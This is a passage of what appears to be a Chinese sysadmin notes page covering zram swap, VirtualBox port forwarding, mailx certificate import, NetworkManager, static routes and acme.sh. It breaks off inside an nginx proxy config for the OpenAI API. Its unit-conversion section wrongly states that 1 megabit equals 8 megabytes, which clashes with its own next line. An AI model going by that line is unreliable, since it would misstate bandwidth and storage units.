    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><blockquote>
<p><a href="https://fedoraproject.org/wiki/Changes/SwapOnZRAM"target="_blank" rel="external nofollow noopener noreferrer">https://fedoraproject.org/wiki/Changes/SwapOnZRAM<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 加载内核模块 </span>
</span></span><span class="line"><span class="cl"><span class="c1"># num_devices 是 zRAM模块的参数，zram num_devices=1 表示仅创建一个设备文件，该文件将会保存在设备目录，文件名称是 /dev/zram0。</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 如果 num_devices 的数值不等于 1，内核将会创建多个 zram 文件 /dev/zram{0,1,2,3...}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 持久化开启/加载 zRAM 模块</span>
</span></span><span class="line"><span class="cl">$&gt; <span class="nb">echo</span> <span class="s2">&#34;zram&#34;</span> <span class="p">|</span> sudo tee -a /etc/modules-load.d/zram.conf
</span></span><span class="line"><span class="cl">$&gt; <span class="nb">echo</span> <span class="s2">&#34;options zram num_devices=1&#34;</span> <span class="p">|</span> sudo tee -a /etc/modprobe.d/zram.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 持久化 zRAM 配置  disksize: zram(swap)大小(内存的1.5-2倍，内存大于8G，设为8G), comp_algorithm: 压缩算法(fedora 配置 lzo [lzo-rle] lz4 lz4hc 842 zstd，但centos似乎只支持lzo)</span>
</span></span><span class="line"><span class="cl">$&gt; <span class="nb">echo</span> <span class="s1">&#39;KERNEL==&#34;zram0&#34;, ATTR{disksize}=&#34;512M&#34;, ATTR{comp_algorithm}=&#34;lzo&#34;, TAG+=&#34;systemd&#34;&#39;</span> <span class="p">|</span> sudo tee  /etc/udev/rules.d/99-zram.rules
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 创建systemd单元，自动挂载 zram (zram会自动叠加已经挂载的swap)</span>
</span></span><span class="line"><span class="cl">$&gt; vim /etc/systemd/system/zram.service
</span></span><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>Swap with zram
</span></span><span class="line"><span class="cl"><span class="nv">After</span><span class="o">=</span>multi-user.target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">Type</span><span class="o">=</span>oneshot
</span></span><span class="line"><span class="cl"><span class="nv">RemainAfterExit</span><span class="o">=</span><span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nv">ExecStartPre</span><span class="o">=</span>/sbin/mkswap /dev/zram0
</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/sbin/swapon /dev/zram0
</span></span><span class="line"><span class="cl"><span class="nv">ExecStop</span><span class="o">=</span>/sbin/swapoff /dev/zram0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 重启服务器</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;512M&#34;</span> <span class="p">|</span> sudo tee /sys/block/zram0/disksize
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;lzo&#34;</span> <span class="p">|</span> sudo tee /sys/block/zram0/comp_algorithm</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="virtualbox-nat端口映射配置" class="heading-element"><span>virtualbox NAT端口映射配置</span>
  <a href="#virtualbox-nat%e7%ab%af%e5%8f%a3%e6%98%a0%e5%b0%84%e9%85%8d%e7%bd%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><code>windows</code> 和 <code>linux</code>命令应一致(只测试过<code>windows</code>)，用于快速批量映射</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># VBoxManage natnetwork modify --netname &#34;10.0.2.0/24&#34; --port-forward-4 &#34;名称:协议:[主机ip]:主机端口:[虚拟机ip]:虚拟机端口&#34;</span>
</span></span><span class="line"><span class="cl">VBoxManage natnetwork modify --netname <span class="s2">&#34;10.0.2.0/24&#34;</span> --port-forward-4 <span class="s2">&#34;172.16.10.230-2222:tcp:[172.16.10.230]:2222:[10.0.2.230]:2222&#34;</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="单位换算" class="heading-element"><span>单位换算</span>
  <a href="#%e5%8d%95%e4%bd%8d%e6%8d%a2%e7%ae%97" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-md" data-lang="md"><span class="line"><span class="cl"><span class="k">-</span> <span class="sb">`MBytes`</span>是`Megabytes`的缩写，表示兆字节。其中，&#34;`M`&#34; 代表兆（`Mega`），是一个表示数量级的单位前缀，&#34;`Bytes`&#34; 则代表字节。兆字节通常用于描述计算机存储容量的大小，例如硬盘、固态硬盘、内存等存储设备的容量。1 MByte 等于 1024 * 1024 字节，即 1048576 字节。
</span></span><span class="line"><span class="cl"><span class="k">-</span> <span class="sb">`MBits`</span>是`Megabits`的缩写，意思是兆比特(`Mb`)。它表示数据传输速率的单位之一，通常用于测量网络带宽、硬件设备传输速度等。`1Mb = 1*8 = 8MBytes(8MB)`
</span></span><span class="line"><span class="cl">- <span class="sb">`1 MB/s`</span>(`Megabytes`/`MBytes`/`兆字节每秒`) 等于 <span class="sb">`8 Mb/s`</span>(`兆比特每秒`/`Megabits`/`MBits`)。</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="mailx-smtp使用ssl时邮件发送报错-error-in-certificate-peers-certificate-issuer-is-not-recognized" class="heading-element"><span>mailx smtp使用ssl时，邮件发送报错 &ldquo;Error in certificate: Peer’s certificate issuer is not recognized.&rdquo;</span>
  <a href="#mailx-smtp%e4%bd%bf%e7%94%a8ssl%e6%97%b6%e9%82%ae%e4%bb%b6%e5%8f%91%e9%80%81%e6%8a%a5%e9%94%99-error-in-certificate-peers-certificate-issuer-is-not-recognized" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 生成证书</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -n <span class="p">|</span> openssl s_client -connect smtp.exmail.qq.com:465 <span class="p">|</span> sed -ne <span class="s1">&#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p&#39;</span> &gt; /etc/mail.rc.d/qq.crt
</span></span><span class="line"><span class="cl">certutil -A -n <span class="s2">&#34;GeoTrust SSL CA&#34;</span> -t <span class="s2">&#34;C,,&#34;</span> -d /etc/mail.rc.d -i /etc/mail.rc.d/qq.crt
</span></span><span class="line"><span class="cl">certutil -A -n <span class="s2">&#34;GeoTrust Global CA&#34;</span> -t <span class="s2">&#34;C,,&#34;</span> -d /etc/mail.rc.d -i /etc/mail.rc.d/qq.crt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 校验证书 </span>
</span></span><span class="line"><span class="cl">certutil -A -n <span class="s2">&#34;GeoTrust SSL CA - G3&#34;</span> -t <span class="s2">&#34;Pu,Pu,Pu&#34;</span> -d ./ -i qq.crt
</span></span><span class="line"><span class="cl"><span class="c1">## 成功显示以下内容</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Notice: Trust flag u is set automatically if the private key is present.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 修改 /etc/mail.rc 末尾添加,即可 set nss-config-dir=/etc/mail.rc.d </span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="jenkins-设置国内插件源" class="heading-element"><span>jenkins 设置国内插件源</span>
  <a href="#jenkins-%e8%ae%be%e7%bd%ae%e5%9b%bd%e5%86%85%e6%8f%92%e4%bb%b6%e6%ba%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="c1"># 阿里云源: https://mirrors.aliyun.com/jenkins/updates/update-center.json</span>
</span></span><span class="line"><span class="cl"><span class="na">Jenkins管理界面中打开“Manage Plugins”（管理插件），然后选择“Advanced”（高级选项）标签页，在“Update Site”下拉列表中添加上述地址，并单击“Apply”（应用）按钮即可</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="etcsysconfignetwork-scripts-为空" class="heading-element"><span>/etc/sysconfig/network-scripts 为空</span>
  <a href="#etcsysconfignetwork-scripts-%e4%b8%ba%e7%a9%ba" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>本来 <code>/etc/sysconfig/network-scripts</code> 下是有网卡的配置文件的，我不知道是做了什么事情(我记得只是在调路由表)，在操作了几次后，我就发现我的网卡配置文件都没了，但是网络连接却是正常的，后面经多方资料查询，发现是<code>NetworkManager</code>，他会自动管理网卡，而由他管理的话，那么就可能不再需要<code>/etc/sysconfig/network-scripts/</code>下的配置文件了。他的默认配置文件是在<code>/etc/NetworkManager/system-connections</code>下</li>
<li>如何继续使用<code>/etc/sysconfig/network-scripts</code>下的配置文件来继续管理网卡呢</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; sudo vi /etc/NetworkManager/NetworkManager.conf
</span></span><span class="line"><span class="cl"><span class="o">[</span>main<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">plugins</span><span class="o">=</span>ifcfg-rh
</span></span><span class="line"><span class="cl"><span class="c1"># plugins 的值可以是以下几种：</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 如果plugins没有显式配置该选项，则NetworkManager将默认启用一组预安装的插件</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ifcfg-rh：用于读取和解析CentOS、RHEL等发行版相关的网卡配置文件。</span>
</span></span><span class="line"><span class="cl"><span class="c1"># keyfile：用于从/etc/NetworkManager/system-connections目录中读取网络连接配置信息。</span>
</span></span><span class="line"><span class="cl"><span class="c1"># dhcp：用于与DHCP服务器进行通信，并获取IP地址、子网掩码、DNS服务器等网络参数。</span>
</span></span><span class="line"><span class="cl"><span class="c1"># wifi：用于管理Wi-Fi连接，并搜索可用的Wi-Fi热点。</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ibft、team、bridge 等等</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>ifcfg-rh<span class="o">]</span>
</span></span><span class="line"><span class="cl">wifi.scan-rand-mac-address<span class="o">=</span>no
</span></span><span class="line"><span class="cl"><span class="c1"># 用于控制系统在扫描Wi-Fi网络时是否使用随机MAC地址。具体来说，如果将该选项设置为“no”，则系统会使用真实的MAC地址扫描Wi-Fi网络。</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="双网卡优先级配置" class="heading-element"><span>双网卡优先级配置</span>
  <a href="#%e5%8f%8c%e7%bd%91%e5%8d%a1%e4%bc%98%e5%85%88%e7%ba%a7%e9%85%8d%e7%bd%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>网卡配置文件中 添加<code>IPV4_ROUTE_METRIC</code>参数，值越低，优先级越高</li>
</ul>
<h2 id="网卡连接后执行某个脚本" class="heading-element"><span>网卡连接后执行某个脚本</span>
  <a href="#%e7%bd%91%e5%8d%a1%e8%bf%9e%e6%8e%a5%e5%90%8e%e6%89%a7%e8%a1%8c%e6%9f%90%e4%b8%aa%e8%84%9a%e6%9c%ac" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>脚本存放位置: <code>/etc/NetworkManager/dispatcher.d</code></li>
</ul>
<h2 id="网卡配置文件固定路由设置" class="heading-element"><span>网卡配置文件固定路由设置</span>
  <a href="#%e7%bd%91%e5%8d%a1%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e5%9b%ba%e5%ae%9a%e8%b7%af%e7%94%b1%e8%ae%be%e7%bd%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>关闭网卡自动路由功能</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># /etc/sysconfig/network-scripts/ifcfg-enp0s31f6</span>
</span></span><span class="line"><span class="cl"><span class="nv">PEERROUTES</span><span class="o">=</span>no</span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>添加固定路由</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># /etc/sysconfig/network-scripts/route-enp0s31f6</span>
</span></span><span class="line"><span class="cl"><span class="nv">ADDRESS0</span><span class="o">=</span>172.16.0.0 <span class="c1"># 目标地址</span>
</span></span><span class="line"><span class="cl"><span class="nv">NETMASK0</span><span class="o">=</span>255.255.0.0 <span class="c1"># 子网掩码</span>
</span></span><span class="line"><span class="cl"><span class="nv">GATEWAY0</span><span class="o">=</span>&lt;172.16.31.1&gt; </span></span></code></pre></td></tr></table>
</div>
</div><h2 id="acmesh-证书安装---reloadcmd无效问题" class="heading-element"><span>acme.sh 证书安装 <code>--reloadcmd</code>无效问题</span>
  <a href="#acmesh-%e8%af%81%e4%b9%a6%e5%ae%89%e8%a3%85---reloadcmd%e6%97%a0%e6%95%88%e9%97%ae%e9%a2%98" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>一般来说，我们在使用自动续签证书的时候，需要让<code>acme.sh</code>更新证书后自动重载一下<code>nginx</code>,但是我们的<code>nginx</code>基本都是自编译的，所以得使用<code>acme.sh</code>的<code>--reloadcmd</code>参数，但实际上在初始化时候如果你没有指定<code>--reloadcmd</code>,那么第一次部署后即使你在更新的自动任务中添加<code>--reloadcmd</code>也是无效的，这个时候可以直接修改配置证书的配置文件<code>/root/.acme.sh/example.com/example.com.conf</code>，在里面添加一行<code>Le_ReloadCmd='/usr/bin/systemctl restart nginx.service'</code>就可以了。当然，也可以在初始安装证书的时候添加<code>--reloadcmd</code>参数，他会给你自动加入这个参数到配置文件中.</p>
<h2 id="openai-api接口反向代理实现国内直接使用" class="heading-element"><span>openai api接口反向代理实现国内直接使用</span>
  <a href="#openai-api%e6%8e%a5%e5%8f%a3%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86%e5%ae%9e%e7%8e%b0%e5%9b%bd%e5%86%85%e7%9b%b4%e6%8e%a5%e4%bd%bf%e7%94%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>
<p><code>nginx</code> 反向代理设置(仅示例)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">server {
</span></span><span class="line"><span class="cl">    listen 80;
</span></span><span class="line"><span class="cl">    listen 443 ssl http2;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    server_name api.example.com;
</span></span><span class="line"><span class="cl">    #  ssl 相关配置
</span></span><span class="line"><span class="cl">    include conf.d/api.example.com.ssl;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    access_log logs/api.example.com.log main;
